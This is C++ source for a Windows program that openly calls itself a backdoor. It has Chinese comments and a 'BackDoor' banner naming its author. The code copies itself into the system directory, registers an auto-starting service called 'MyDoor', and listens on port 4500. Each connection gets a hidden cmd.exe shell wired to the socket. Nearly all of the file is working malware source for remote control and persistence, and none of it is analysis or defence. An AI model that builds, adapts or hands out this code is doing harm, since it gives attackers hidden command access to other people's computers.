// autorun.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <windows.h>
#include <Winsvc.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

void WINAPI ServiceControl(DWORD dwCode)
{
    switch(dwCode)
    {
		//服务暂停
    case SERVICE_CONTROL_PAUSE:
        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
		//服务继续
    case SERVICE_CONTROL_CONTINUE:
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
		//服务停止
    case SERVICE_CONTROL_STOP:      
        ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCheckPoint    = 0;
        ServiceStatus.dwWaitHint      = 0;
		//设置服务状态
        if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
        {
            OutputDebugString("SetServiceStatus in ServiceControl in Switch Error !\n");
        }
        return ;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }
	//设置服务状态
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus in ServiceControl out Switch Error !\n");
    }
    return ;
}


DWORD WINAPI Thread( LPVOID lpParam )
{   
	SOCKET s=(SOCKET)lpParam;
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//使cmd的输入输出直接和socket关联
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//得到cmd路径
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//建立cmd进程
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//等待进程结束
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}


DWORD WINAPI RunService(LPVOID lpParam)
{
	char wMessage[512] = "\r\n========================  BackDoor by 认真的雪  ========================\r\n";
	//建立socket数组
	SOCKET sClient[5];
    //初始化socket，并且监听端口
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	//设置socket属性
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	//监听端口，参数5表示最多只能接受五个连接
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	DWORD dwThreadId;
	//循环，用于接收连接，这里的循环次数和前面listen函数中的第二个参数要一致，
	//因为只能接收5个连接，循环一次接收一个连接，所以只能循环5次
	for(int i=0;i<5;i++)
	{
		//接收连接
        sClient[i]  =accept(sListen,NULL,NULL);
		//创建cmdshell进程
		CreateThread(NULL,NULL,Thread,(LPVOID)sClient[i],0,&dwThreadId);
		//发送欢迎消息
		send(sClient[i],wMessage,strlen(wMessage),0);
	}
	return 0;
}



void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpArgv)
{
    HANDLE    hThread;
	//填写SERVICE_STATUS 结构
    ServiceStatus.dwServiceType             = SERVICE_WIN32;
    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP
		| SERVICE_ACCEPT_PAUSE_CONTINUE;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 0;
	//注册服务控制函数
    ServiceStatusHandle=RegisterServiceCtrlHandler("MyDoor",ServiceControl);
    if(ServiceStatusHandle==0)
    {
        OutputDebugString("RegisterServiceCtrlHandler Error !\n");
        return ;
    }
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;   
	//设置服务状态
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus Error !\n");
        return ;
    }
	//启动后门线程
    hThread=CreateThread(NULL,0,RunService,NULL,0,NULL);
    if(hThread==NULL)
    {
        OutputDebugString("CreateThread Error !\n");
    }
    return ;
}

int APIENTRY InstallService()
{
	SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
    DWORD            dwErrorCode;
    SERVICE_STATUS   InstallServiceStatus;
    char SystemPath[256];
	char SelfFile[MAX_PATH];
	//得到系统目录路径
	GetSystemDirectory(SystemPath,sizeof(SystemPath));
	strcat(SystemPath,"\\door.exe");
	//得到自身文件路径
	GetModuleFileName (NULL, SelfFile, MAX_PATH);
	//复制自身到系统目录
	if(!CopyFile(SelfFile,SystemPath,true))
		return 0;
	//打开服务控制管理器数据库
    schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
    {
        printf("OpenSCManager Error !\n");
        return 0 ;
    }
    //创建服务
    schService=CreateService(schSCManager,"MyDoor","MyDoor",SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,SystemPath,NULL,NULL,NULL,NULL,NULL); 
	//创建失败
    if(schService==NULL)
    {		
        dwErrorCode=GetLastError();
        if(dwErrorCode!=ERROR_SERVICE_EXISTS)
        {
            printf("CreateService Error !\n");
            CloseServiceHandle(schSCManager);
			return 0 ;
        }
		//如果服务存在
        else
        {
			//假如服务已存在则打开服务
            schService=OpenService(schSCManager,"MyDoor",SERVICE_START);
			//打开失败
            if(schService==NULL)
            {
				printf("OpenService Error !\n");              
                CloseServiceHandle(schSCManager);
                return 0 ;
            }
        }
    }
    //启动服务
    if(StartService(schService,0,NULL)==0)                         
    {   	 
        dwErrorCode=GetLastError();
		//服务正在运行
        if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)
        {
			printf("StartService Error !\n");
			CloseServiceHandle(schSCManager);  
			CloseServiceHandle(schService);
			return 0;
        }
    } 
	//查询服务状态
    while(QueryServiceStatus(schService,&InstallServiceStatus)!=0)           
    {   //服务是否在初始化阶段
        if(InstallServiceStatus.dwCurrentState==SERVICE_START_PENDING)
        {
            Sleep(100);
        }
        else
        {
            break;
        }
    }
	//查询服务状态，看有没有启动成功
    if(InstallServiceStatus.dwCurrentState!=SERVICE_RUNNING)
    {
        printf("Install service Failed");                   
    }
    else
    {
		printf("Install service Successed");     
    }
    CloseServiceHandle(schSCManager);
    CloseServiceHandle(schService);
    return 1 ;
}

int RemoveService()
{
	SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
	SERVICE_STATUS NServiceStatus;
    //打开服务控制管理器数据库
	schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
		return 0;
	//打开服务
	schService=OpenService(schSCManager,"MyDoor",SERVICE_ALL_ACCESS);
	if(schService==NULL)
		return 0;
    //查询服务状态
	QueryServiceStatus(schService,&NServiceStatus);
	//如果服务正在运行就停止服务
	if(NServiceStatus.dwCurrentState==SERVICE_RUNNING)
	{
		ControlService(schService,SERVICE_CONTROL_STOP,&NServiceStatus);	
	}
	//删除服务
	if(DeleteService(schService))
	{
		printf("remove service Successed");	
		//关闭打开的句柄
		CloseServiceHandle(schSCManager);
		CloseServiceHandle(schService);			
		return 0;
	}
	else
	{
		printf("remove service Failed");
		//关闭打开的句柄
		CloseServiceHandle(schSCManager);
		CloseServiceHandle(schService);
		return 0;
	}
}

int main(int argc, char* argv[])
{
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		//服务程序的名称和入口点；
		{"MyDoor",ServiceMain},
			//SERVICE_TABLE_ENTRY结构必须以“NULL”结束
		{NULL    ,NULL    }
	};
	//连接服务控制管理器，开始控制调度程序线程
	StartServiceCtrlDispatcher(DispatchTable);
	if(argc==2)
	{
		if(!stricmp(argv[1],"-install"))
		{
			//创建服务
			InstallService();
		}
		if(!stricmp(argv[1],"-remove"))
		{
			//删除服务
			RemoveService();
		}
	}	
	return 0;
}
